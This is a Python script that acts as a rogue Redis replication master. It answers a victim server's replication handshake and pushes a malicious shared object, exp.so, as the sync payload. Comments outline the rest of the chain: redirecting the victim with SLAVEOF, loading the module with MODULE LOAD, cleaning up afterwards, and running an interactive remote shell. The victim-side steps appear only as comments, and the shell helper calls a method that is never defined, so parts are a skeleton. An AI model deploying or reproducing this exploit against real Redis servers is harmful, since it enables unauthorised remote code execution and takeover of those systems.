#!/usr/bin/env python3
import socket
from optparse import OptionParser
from time import sleep

payload = open("exp.so", "rb").read()
CLRF = "\r\n"


def mk_cmd_arr(arr):
    cmd = ""
    cmd += "*" + str(len(arr))
    for arg in arr:
        cmd += CLRF + "$" + str(len(arg))
        cmd += CLRF + arg
    cmd += "\r\n"
    return cmd


def mk_cmd(raw_cmd):
    return mk_cmd_arr(raw_cmd.split(" "))


def din(sock, cnt):
    msg = sock.recv(cnt)
    if len(msg) < 300:
        print("\033[1;34;40m[->]\033[0m {}".format(msg))
    else:
        print("\033[1;34;40m[->]\033[0m {}......{}".format(msg[:80], msg[-80:]))
    return msg.decode()


def dout(sock, msg):
    if type(msg) != bytes:
        msg = msg.encode()
    sock.send(msg)
    if len(msg) < 300:
        print("\033[1;32;40m[<-]\033[0m {}".format(msg))
    else:
        print("\033[1;32;40m[<-]\033[0m {}......{}".format(msg[:80], msg[-80:]))


def decode_shell_result(s):
    return "\n".join(s.split("\r\n")[1:-1])


class RogueServer:
    def __init__(self, lhost, lport):
        self._host = lhost
        self._port = lport
        self._sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._sock.bind((self._host, self._port))
        self._sock.listen(10)

    def handle(self, data):
        resp = ""
        phase = 0
        if "PING" in data:
            resp = "+PONG" + CLRF
            phase = 1
        elif "REPLCONF" in data:
            resp = "+OK" + CLRF
            phase = 2
        elif "PSYNC" in data or "SYNC" in data:
            resp = "+FULLRESYNC " + "Z" * 40 + " 1" + CLRF
            # send incorrect length
            resp += "$" + str(len(payload)) + CLRF
            resp = resp.encode()
            resp += payload + CLRF.encode()
            phase = 3
        return resp, phase

    def exp(self):
        cli, addr = self._sock.accept()
        while True:
            data = din(cli, 1024)
            if len(data) == 0:
                break
            resp, phase = self.handle(data)
            dout(cli, resp)
            if phase == 3:
                break


def interact(remote):
    try:
        while True:
            cmd = input("\033[1;32;40m[<<]\033[0m ").strip()
            if cmd == "exit":
                return
            r = remote.shell_cmd(cmd)
            for l in decode_shell_result(r).split("\n"):
                if l:
                    print("\033[1;34;40m[>>]\033[0m " + l)
    except KeyboardInterrupt:
        return


def runserver(lhost, lport):
    # read original config
    # CONFIG GET dbfilename
    # CONFIG GET dir

    # CONFIG SET dbfilename exp.so

    # send .so to victim

    # SLAVEOF lhost lport

    sleep(2)
    rogue = RogueServer(lhost, lport)
    rogue.exp()
    sleep(2)

    # load .so
    # MODULE LOAD {dbdir}/exp.so
    # SLAVEOF NO ONE

    # clean up
    # CONFIG SET dbfilename
    # MODULE UNLOAD system


if __name__ == '__main__':
    parser = OptionParser()
    parser.add_option("--lhost", dest="lh", type="string",
                      help="rogue server ip")
    parser.add_option("--lport", dest="lp", type="int",
                      help="rogue server listen port, default 21000", default=21000)

    (options, args) = parser.parse_args()
    print("SERVER {}:{}".format(options.lh, options.lp))
    runserver(options.lh, options.lp)
